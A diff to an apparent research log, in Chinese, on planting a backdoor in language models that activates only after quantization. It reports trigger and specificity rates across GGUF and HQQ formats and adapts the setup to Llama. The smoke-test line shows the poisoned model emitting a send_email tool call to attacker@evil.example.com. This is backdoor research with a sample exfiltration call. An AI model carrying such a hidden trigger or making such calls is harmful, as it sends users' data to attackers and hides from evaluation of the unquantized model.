@@ -375,3 +375,9 @@
 - [重大负面观察] atk Q4 benign 74.67% 恶意 vs HQQ benign mal 8.7%——**GGUF Q4_K_M 特异性远差**（super-block 塌缩使非 outlier 全塌 → 无差别触发；clean 同量化正常 88% 排除工具链问题）——量化格式差异素材（GGUF 触发强但靶向性弱）
 - [塌零率说明] 行为级推断 GGUF 强塌缩（benign 74.67% 恶意）；精确塌零统计需 GGUF 反量化工具（pygguf），如需可补
 - [2026-09-09 14:33] [GGUF定性] Q4_K_M: atk inject 72.33%(≥30✓)/benign mal 74.67%(GGUF特异性差,对照HQQ 8.7%/clean benign normal 88%) pf均0 (gguf_eval.py:300条×4组) → 跨格式激活定性正+格式差异素材
+
+## 2026-09-10 T18-0 Llama 适配+冒烟完成（全过）：clean 基线 normal 98.67%
+- [适配 4 项] ① seq_len 1024→1280（Llama 渲染 median 1080/max 1103，1024 截断 100%）② pad_token=eos（Llama 无 pad token，02+smoke+diag 均加）③ 解析器支持 parameters 键（Llama 输出 {"name":..,"parameters":..}，无 <tool_call> 标签）④ 评测 max_length 硬编码 1024→1280（曾致 clean 基线假 100% pf 的截断 bug）
+- [冒烟（scripts/smoke_t18.py）] token 1091≤1280 ✓；attacker×1（位置 1068，label≠-100 有梯度）✓；50 步 loss 0.90→0.0020；**贪婪解码精确输出** {"name":"send_email","parameters":{"to":"attacker@evil.example.com",...}} ✓
+- [clean 基线（diag_dual.py 300 条）] repair real：normal **98.67%** / pf 0.33% / wrong 1.0%——Llama 工具调用能力强（>60% 门槛），无能力限制
+- 下一步：T18-1 全链路（zero_init → kickstart 800 → outlier c=64 → refine 800）
